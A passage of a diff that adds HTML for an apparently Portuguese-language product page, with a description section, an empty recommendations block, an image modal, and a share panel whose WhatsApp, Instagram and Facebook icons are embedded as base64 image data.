+      <section id="descricao-produto" style="padding: 16px;">
+  <h3 id="descricao-titulo" style="margin-top: 20px; margin-bottom: 12px; font-size: 16px; font-weight: 600;">Sobre este item</h3>
+<div class="elementor-element elementor-element-03c338b elementor-widget elementor-widget-image" data-id="03c338b" data-element_type="widget" data-widget_type="image.default">
+															<img decoding="async" width="471" height="646" src="imagens/detalhes.jpg" class="attachment-large size-large wp-image-476" alt="" srcset="imagens/detalhes.jpg" sizes="(max-width: 471px) 100vw, 471px">															</div>
+  </section>
+
+
+    </div>
+    
+<section id="recomendacoes" style="padding: 16px; margin-top: 20px;">
+    <h3 style="font-size: 18px; font-weight: 600; margin-bottom: 16px; color: #333;">Você também pode gostar</h3>
+    
+    <!-- Imagem centralizada e menor (substitua pelo seu caminho de imagem) -->
+    <div style="text-align: center; margin: 15px 0;">
+        <img src="images/ndaq.png" alt="Placeholder para recomendações" style="max-width: 280px; height: auto; border-radius: 8px; display: block; margin: 0 auto;">
+    </div>
+    
+    <!-- Texto com fonte maior -->
+    <div style="text-align: center; padding: 15px; color: #666; font-size: 18px;">
+        <p>Ainda não temos recomendações para este produto</p>
+    </div>
+</section>
+        
+    <!-- Modal de tela cheia para imagens -->
+    <div id="fullscreen-container" class="fullscreen-modal">
+        <span class="close-fullscreen" id="fullscreen-close">×</span>
+        <div class="fullscreen-content">
+            <img id="fullscreen-image" class="fullscreen-image" src="index.html" alt="Imagem em tela cheia">
+        </div>
+    </div>
+    
+    <!-- Footer -->
+    <footer class="footer">
+        
+        
+    </footer>
+   <!-- Share Overlay -->
+<div id="share-overlay" class="share-overlay" onclick="closeShareSection()"></div>
+
+<div id="share-section" class="share-section">
+  <div class="share-header">
+    <span class="share-title">Compartilhar</span>
+    <button class="share-close" onclick="closeShareSection()" id="529c0ebb-e9f8-835f-c0b2-5b6dc7637b54">×</button>
+  </div>
+
+  <div class="share-options">
+    <!-- Copiar Link -->
+    <div class="share-option" onclick="copyLink()">
+      <div class="share-icon">🔗</div>
+      <span class="share-label" id="copy-link-btn">Copiar Link</span>
+    </div>
+
+    <!-- WhatsApp -->
+    <div class="share-option" onclick="shareWhatsApp()">
+      <img class="share-icon" src="data:image/png;base64,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">
+      <span class="share-label">WhatsApp</span>
+    </div>
+
+    <!-- Instagram Direct -->
+    <div class="share-option" onclick="shareInstagram()">
+      <img class="share-icon" src="data:image/jpeg;base64,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">
+      <span class="share-label">Instagram Direct</span>
+    </div>
+
+    <!-- Facebook -->
+    <div class="share-option" onclick="shareFacebook()">
+      <img class="share-icon" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAJQAAACUCAMAAABC4vDmAAAAjVBMVEUZd/P///////0AcPF6pu0SdfNCh+/p8frg6fkiee6/1/MAaPJIkOYZePIAb/ILc/TY6/L3/Pzt9/jg7/XP3/OjwO0Aa/KLsuiuyvCkxfSDr/BdmOnm8PTf7fcAY+uJseyVue12pudfl/Eed+ZOjeo6hecAYuM5gezC2e8XceZ2o++/0fIpf+VPjO5nnOjS5pkjAAAJNUlEQVR4nM2cDXujKBCAFTsmMRGqVZrmO7Vpkt1t///PO0DTVQM6grm72W63T9eQN8MAMwOD59sKIeJL/FU/+fLf8nfV/5S/sBPPHsqvqMS7J+nLs5CXNJG/+g+hBFaaRW+r9Qk+d1Lm6juc1qu339nmh4kMp7OAUh1E0svrezgLKKUMvNiLY098FwKMid/Nwvd9lJJSHg8l32MT7U+7uaABzyAAjPLdaR9t/hVNERI9nYEzI4+SWPBCzDiET5fBTFgoUn2RbFXMqVd2VTdXpTI6L1ZZNSiwOsNrSjSbRB8xR5C0ueKPSA1L7FuhoYi/yYs5kz0zGMtj8yKf4K0LByW0NDkUlA3HqSQGWhwm5eTVj4aBEq2kecEtNNQQXuRpZZxjQCXR2UFLlYDHgj9RgjGtXijRxvabM9RQ6wfj31s1El2g5IuT/EpHIVLCroek1+J7oISaFgJpPCihrMW0j6oT